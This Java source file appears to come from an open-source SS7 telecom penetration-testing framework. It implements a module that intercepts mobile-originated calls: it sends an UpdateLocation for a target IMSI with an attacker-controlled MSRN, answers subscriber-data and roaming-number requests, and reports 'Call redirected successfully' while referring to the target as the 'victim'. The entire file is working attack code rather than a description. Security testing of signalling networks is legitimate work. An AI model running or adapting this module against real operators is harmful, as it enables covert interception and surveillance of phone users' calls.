/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.ss7.usecases.attacks.interception;

import com.rodan.intruder.ss7.entities.event.model.call.PrnRequest;
import com.rodan.intruder.ss7.entities.event.model.mobility.ClRequest;
import com.rodan.intruder.ss7.entities.event.model.mobility.IsdRequest;
import com.rodan.intruder.ss7.entities.event.model.mobility.UlResponse;
import com.rodan.intruder.ss7.entities.event.service.MapCallHandlingServiceListener;
import com.rodan.intruder.ss7.entities.event.service.MapMobilityServiceListener;
import com.rodan.intruder.ss7.entities.payload.callhandling.PnrResponsePayload;
import com.rodan.intruder.ss7.entities.payload.mobility.IsdResponsePayload;
import com.rodan.intruder.ss7.entities.payload.mobility.UlPayload;
import com.rodan.intruder.ss7.usecases.Ss7ModuleTemplate;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleConstants;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleOptions;
import com.rodan.intruder.ss7.usecases.model.interception.MoCallInterceptionMsrnOptions;
import com.rodan.intruder.ss7.usecases.model.interception.MoCallInterceptionMsrnResponse;
import com.rodan.intruder.ss7.usecases.port.Ss7Gateway;
import com.rodan.library.model.Constants;
import com.rodan.library.model.SupportedCamelPhases;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.SystemException;
import com.rodan.library.model.notification.NotificationType;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import lombok.Builder;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

@Module(name = Ss7ModuleConstants.MO_CALL_INTERCEPTION_MSRN_NAME, category = Ss7ModuleConstants.INTERCEPTION_CATEGORY_DISPLAY_NAME,
        displayName = Ss7ModuleConstants.MO_CALL_INTERCEPTION_MSRN_DISPLAY_NAME, brief = Ss7ModuleConstants.MO_CALL_INTERCEPTION_MSRN_BRIEF,
        description = Ss7ModuleConstants.MO_CALL_INTERCEPTION_MSRN_DESCRIPTION, rank = Ss7ModuleConstants.MO_CALL_INTERCEPTION_MSRN_RANK,
        mainPayload = Constants.UL_PAYLOAD_NAME, display = false)
public class MoCallInterceptionMsrnModule extends Ss7ModuleTemplate implements SignalingModule,
        MapMobilityServiceListener, MapCallHandlingServiceListener {
    final static Logger logger = LogManager.getLogger(MoCallInterceptionMsrnModule.class);

    @Builder
    public MoCallInterceptionMsrnModule(Ss7Gateway gateway, Ss7ModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
        setTaskWaitTime(Ss7ModuleTemplate.MAX_TASK_WAIT_TIME);
    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (MoCallInterceptionMsrnOptions) moduleOptions;
        // TODO IMP: Only change VLR address during UL, leave MSC address to current value
        var payload = UlPayload.builder()
                .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
                .imsi(options.getImsi()).msrn(options.getMsrn())
                .cc(options.getCc()).ndc(options.getNdc()).mcc(options.getMcc()).mnc(options.getMnc())
                .mapVersion(options.getMapVersion())
                .build();
        setMainPayload(payload);
        setCurrentPayload(getMainPayload());
        logger.debug("Payload: " + payload);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        super.addServiceListener();
        var localSsn = getMainPayload().getLocalSsn();
        getGateway().addMobilityServiceListener(localSsn, this);
        getGateway().addCallHandlingServiceListener(localSsn, this);
    }

    @Override
    protected void cleanup() throws SystemException {
        super.cleanup();
        if (getGateway() != null && getMainPayload() != null) {
            var localSsn = getMainPayload().getLocalSsn();
            getGateway().removeMobilityServiceListener(localSsn, this);
            getGateway().removeCallHandlingServiceListener(localSsn, this);
        }
    }

    @Override
    public void onInsertSubscriberDataRequest(IsdRequest request) {
        try {
            logger.debug("##### Received ISD request!");
            logger.debug(request);
            logger.debug("Received ISD request for MSISDN: " + request.getMsisdn() + " from HLR: " + request.getHlrGt() +
                    " with SGSN: " + request.getSgsn());

            var dialog = request.getDialog();
            var invokeId = request.getInvokeId();
            dialog.setUserObject(invokeId);

            var supportedCamelPhases = SupportedCamelPhases.builder()
                    .phase1(true).phase2(true).phase3(true).phase4(true)
                    .build();
            var idsResponsePayload = IsdResponsePayload.builder()
                    .invokeId(invokeId)
                    .supportedCamelPhases(supportedCamelPhases)
                    .build();
            getGateway().addToDialog(idsResponsePayload, dialog);
            getGateway().send(dialog);
            logger.debug("ISD response sent.");

        } catch (SystemException e) {
            String msg = "Failed to handle ISD request";
            logger.error(msg, e);
            notify(msg, NotificationType.FAILURE);setExecutionError(true);
        }
    }

    @Override
    public void onUpdateLocationResponse(UlResponse response) throws SystemException {
        logger.debug("##### Received UK response!");
        logger.debug(response);
        notify("Received UL ACK, waiting for SMS message", NotificationType.PROGRESS);
    }

    @Override
    public void onProvideRoamingNumberRequest(PrnRequest request) {
        try {
            logger.debug("##### Received PNR request!");
            logger.debug(request);

            var dialog = request.getDialog();
            var invokeId = request.getInvokeId();
            dialog.setUserObject(invokeId);

            var options = (UlPayload) getMainPayload();
            var msrn = options.getMsrn();
            var vmsc = options.getNewMscGt();
            var pnrResponsePayload = PnrResponsePayload.builder()
                    .invokeId(invokeId)
                    .msrn(msrn).vmsc(vmsc)
                    .build();
            getGateway().addToDialog(pnrResponsePayload, dialog);
            getGateway().send(dialog);

            moduleResponse = MoCallInterceptionMsrnResponse.builder().result("Call redirected successfully").build();
            setResultReceived(true);
            logger.debug("PNR response sent.");

        } catch (SystemException e) {
            String msg = "Failed to handle PNR request";
            logger.error(msg, e);
            notify(msg, NotificationType.FAILURE);
            setExecutionError(true);
        }
    }

    @Override
    public void onCancelLocationRequest(ClRequest request) {
        logger.debug("##### Received CL request!");
        logger.debug(request);
        notify("CL request received, victim may have performed UL.", NotificationType.WARNING);
    }
}
